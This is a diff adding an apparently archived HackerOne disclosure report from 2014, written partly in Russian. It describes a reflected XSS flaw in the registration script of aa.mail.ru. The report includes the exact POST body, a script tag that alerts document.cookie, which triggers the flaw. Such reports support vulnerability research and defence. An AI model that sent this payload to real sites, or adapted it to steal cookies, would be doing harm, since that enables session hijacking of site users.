@@ -1,0 +1,20 @@
+ReportLink:https://hackerone.com/reports/15654
+WeaknessName:Cross-site Scripting (XSS) - Generic
+Reporter:https://hackerone.com/bigbear
+ReportedTo:Mail.ru(mailru)
+BountyAmount:
+Severity:
+State:Closed
+DateOfDisclosure:07.08.2014 14:09:42
+
+Summary:
+
+Уязвимость существует на сайте http://aa.mail.ru/
+
+в сценарии  http://aa.mail.ru/dynamic/user/?a=register
+
+Посылаем такой пакет данных
+[POST]  
+mail=<script>alert(document.cookie)</script>&mailru_domains=mail.ru&password_mailru=&password_general=&name=kaktakoaddd
+
+Получаем активный alert()
